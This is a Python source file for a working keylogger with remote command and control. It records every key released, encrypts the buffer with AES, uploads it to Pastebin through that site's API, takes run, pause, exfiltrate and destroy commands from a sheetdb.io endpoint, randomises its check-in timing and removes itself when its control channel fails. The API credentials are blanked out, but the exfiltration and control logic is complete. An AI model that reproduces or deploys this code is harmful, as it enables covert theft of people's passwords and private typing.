import keyboard
import requests
import time
import random
from enum import Enum
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad


VERBOSE = False
NUM_COMMAND_TRIES = 3
aes_key = b''
BLOCK_SIZE = 16 # Bytes

# credentials taken out

def pastebin_login():
    data = {
        'api_dev_key': '',
        'api_user_name': '',
        'api_user_password': '',
    }
    res = requests.post("https://pastebin.com/api/api_login.php", data=data)
    return res

def pastebin_post(ciphertext, api_user_key):
    data = {'api_dev_key': '',
            'api_option': 'paste',
            'api_paste_code': ciphertext,
            'api_paste_name': 'name',
            'api_user_key':api_user_key,
            }
    print(data)
    res = requests.post('https://pastebin.com/api/api_post.php', data=data)
    print(res.text)
    return res

class State(Enum):
    RUNNING = 1
    STOPPED = 2


class Keylogger:
    def __init__(self, api_user_key):
        self.state = State.STOPPED
        self.key_buffer = ''
        self.api_user_key = api_user_key
        if VERBOSE:
            print('Initializing Keylogger')

    def run(self):
        if self.state == State.STOPPED:
            if VERBOSE:
                print('Starting Keylogger')
            self.hook = keyboard.on_release(callback=self.record_key)
            self.state = State.RUNNING

    def stop(self):
        if self.state == State.RUNNING:
            if VERBOSE:
                print('Stopping Keylogger')
                print(self.hook)
            keyboard.unhook(self.hook)
            self.state = State.STOPPED

    def extract_data(self):
        
        if VERBOSE:
            print('Uploading key logs')
        rand_time = random.random()
        time.sleep(rand_time)

        cipher = AES.new(aes_key, AES.MODE_ECB)
        ciphertext = cipher.encrypt(pad(str.encode(self.key_buffer), BLOCK_SIZE))
        res = pastebin_post(ciphertext.hex(), self.api_user_key)

        if VERBOSE:
            print('Pastebun response:', res, res.status_code)
        return res

    def record_key(self, key):
        key = key.name
        if key == 'space':
            key = ' '
        self.key_buffer += key

    def self_destruct(self):
        self.stop()

def get_command():
    response = requests.get('https://sheetdb.io/api/v1/???')
    return response.json()[0]['Company']

def self_destruct(keylogger):
    # Some problem with command and control or instructed to self destruct
    if VERBOSE:
        print('Self destructing')
    keylogger.self_destruct()

def main():

    res = pastebin_login()
    keylogger = Keylogger(res.text)
    failed_tries = 0
    last_command = ''
    try:
        while True:
            try:
                command = get_command()[0]
            except:
                # if can't get command, must self destruct
                break
            if command != last_command:
                if VERBOSE:
                    print('Command:', command)

                if command == 'R':
                    last_command = 'R'
                    keylogger.run()

                elif command == "P":
                    last_command = 'P'
                    keylogger.stop()

                elif command == "E":
                    last_command = 'E'
                    res = keylogger.extract_data()
                    if res != None and res.status_code != 200:
                        # some problem with our exfil, must self destruct
                        break

                elif command == "D":
                    break
                else:
                    if failed_tries < NUM_COMMAND_TRIES:
                        # no valid command, wait some time then try again
                        failed_tries += 1
                    else:
                        # Too many fails, self destruct
                        break
                
            # checks in 2 to 3 second intervals randomly
            time.sleep(random.random() + 2)
        
        # if loop ends, it means we intend to self destruct
        self_destruct(keylogger)
                
    except BaseException as e:
        self_destruct(keylogger)

if __name__ == "__main__":
    main()